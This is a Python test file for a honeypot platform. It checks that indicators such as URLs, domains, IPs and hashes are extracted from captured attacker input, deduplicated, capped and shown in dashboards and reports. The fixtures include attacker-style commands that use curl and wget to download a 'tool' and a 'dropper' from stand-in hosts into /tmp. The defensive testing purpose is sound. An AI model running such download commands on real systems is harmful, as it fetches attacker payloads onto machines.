from aegis_nexus.app import create_app
from aegis_nexus.derivation import MAX_ARTIFACTS_PER_EVENT, derive_observed_artifacts
from aegis_nexus.model import normalize_event


def _by_type(event):
    return {
        (item["type"], item["value"]): item
        for item in event["derived"].get("ioc", [])
        if isinstance(item, dict)
    }


def test_extracts_exact_artifacts_with_evidence_without_malicious_label():
    sha256 = "a" * 64
    event = normalize_event({
        "honeypot": "ssh-1",
        "event_type": "command",
        "observed": {
            "source_ip": "203.0.113.10",
            "service": "ssh",
            "protocol": "tcp",
            "destination_port": 22,
            "command": f"curl https://Downloads.Example.org/tool -o /tmp/x; echo {sha256}; ping 198.51.100.7",
        },
    })
    derived = derive_observed_artifacts(event)
    items = _by_type(derived)

    assert ("url", "https://Downloads.Example.org/tool") in items
    assert ("domain", "downloads.example.org") in items
    assert ("ip", "198.51.100.7") in items
    assert ("sha256", sha256) in items
    for item in items.values():
        assert item["classification"] == "observed_artifact"
        assert item["evidence"] == ["observed.command"]
        assert "malicious" not in str(item).lower()


def test_preserves_existing_sensor_ioc_and_deduplicates_extracted_values():
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "web.payload",
        "observed": {
            "source_ip": "203.0.113.11",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
            "payload": "https://example.org/a https://example.org/a example.org",
        },
        "derived": {
            "ioc": [{
                "type": "pattern",
                "value": "command-staging-like-input",
                "evidence": ["observed.payload"],
            }]
        },
    })
    derived = derive_observed_artifacts(event)
    items = derived["derived"]["ioc"]

    assert items[0]["type"] == "pattern"
    assert sum(1 for item in items if item.get("type") == "url") == 1
    assert sum(1 for item in items if item.get("type") == "domain" and item.get("value") == "example.org") == 1


def test_artifact_extraction_is_bounded():
    payload = " ".join(f"host{i}.example.org" for i in range(80))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "web.payload",
        "observed": {
            "source_ip": "203.0.113.12",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
            "payload": payload,
        },
    })
    derived = derive_observed_artifacts(event)
    assert len(derived["derived"]["ioc"]) == MAX_ARTIFACTS_PER_EVENT


def test_collector_persists_artifacts_and_exposes_them_in_dashboard_relations_and_report(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
    })
    client = app.test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "secret"},
        json={
            "honeypot": "ssh-decoy-01",
            "event_type": "command",
            "severity": "medium",
            "observed": {
                "source_ip": "203.0.113.13",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget https://payload.example.org/dropper -O /tmp/x",
            },
        },
    )
    assert response.status_code == 201
    event_id = response.get_json()["id"]
    session_id = response.get_json()["session_id"]

    stored = client.get(f"/api/v1/events/{event_id}").get_json()
    assert any(
        item.get("type") == "domain" and item.get("value") == "payload.example.org"
        for item in stored["derived"]["ioc"]
    )

    dashboard = client.get("/api/v1/dashboard?include_simulation=true").get_json()
    assert any("payload.example.org" in item["label"] for item in dashboard["iocs"])

    relations = client.get(f"/api/v1/relations?session_id={session_id}").get_json()
    assert any(node["kind"] == "ioc" and node["label"] == "payload.example.org" for node in relations["nodes"])

    report = client.get(f"/api/v1/reports/session/{session_id}").get_json()
    assert any(
        entry["ioc"].get("value") == "payload.example.org"
        for entry in report["derived_iocs"]
    )

    search = client.get("/api/v1/events?q=payload.example.org").get_json()
    assert search["items"][0]["id"] == event_id
